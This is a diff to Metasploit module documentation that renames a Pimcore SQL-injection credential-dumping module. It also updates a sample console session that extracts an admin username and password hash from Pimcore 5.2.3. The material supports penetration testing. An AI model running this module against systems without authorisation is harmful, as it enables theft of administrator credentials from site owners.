@@ -16,7 +16,7 @@
 
   1. Install the application
   2. Start msfconsole
-  3. Do: `use auxiliary/sqli/oracle/pimcore_list_creds`
+  3. Do: `use auxiliary/gather/pimcore_creds_sqli`
   4. Do: `set RHOSTS [IP]`
   5. Do: `set TARGETURI [URI]`
   6. Do: `set APIKEY [KEY]`
@@ -34,12 +34,12 @@
 ### Tested on Ubuntu 18.04.1 Running Pimcore v5.2.3
 
   ```
-  msf5 > use auxiliary/sqli/oracle/pimcore_list_creds
-  msf5 auxiliary(sqli/oracle/pimcore_list_creds) > set rhosts 192.168.37.246
+  msf5 > use auxiliary/gather/pimcore_creds_sqli
+  msf5 auxiliary(gather/pimcore_creds_sqli) > set rhosts 192.168.37.246
   rhosts => 192.168.37.246
-  msf5 auxiliary(sqli/oracle/pimcore_list_creds) > set apikey 77369eee2b728e0efbb2c296549aea09b91d3751c26a3c27ce0b1dbb6bfaf11b
+  msf5 auxiliary(gather/pimcore_creds_sqli) > set apikey 77369eee2b728e0efbb2c296549aea09b91d3751c26a3c27ce0b1dbb6bfaf11b
   apikey => 77369eee2b728e0efbb2c296549aea09b91d3751c26a3c27ce0b1dbb6bfaf11b
-  msf5 auxiliary(sqli/oracle/pimcore_list_creds) > run
+  msf5 auxiliary(gather/pimcore_creds_sqli) > run
 
   [+] Credentials obtained:
   [+] admin : $2y$10$sBaD3EOAm/i1F3Mm/fwseeq3nyoacdlUt4NkVLZUgJ4FTReJSKIbe
